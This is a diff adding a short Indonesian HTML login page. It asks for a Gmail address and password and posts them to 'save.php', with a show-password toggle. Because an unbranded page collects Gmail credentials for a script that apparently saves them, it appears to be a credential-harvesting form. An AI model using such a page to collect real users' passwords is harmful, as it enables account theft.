@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+        .container { width: 300px; margin: auto; }
+        input { width: 100%; padding: 10px; margin: 5px 0; }
+        .toggle { cursor: pointer; position: absolute; right: 10px; top: 40px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Login</h2>
+        <form action="save.php" method="POST">
+            <input type="email" name="username" id="username" placeholder="Masukkan Gmail" required><br>
+            
+            <div style="position: relative;">
+                <input type="password" name="password" id="password" placeholder="Masukkan Password" required>
+                <span class="toggle" onclick="togglePassword()">👁️</span>
+            </div>
+            
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <script>
+        function togglePassword() {
+            var pass = document.getElementById("password");
+            pass.type = (pass.type === "password") ? "text" : "password";
+        }
+    </script>
+
+</body>
+</html>
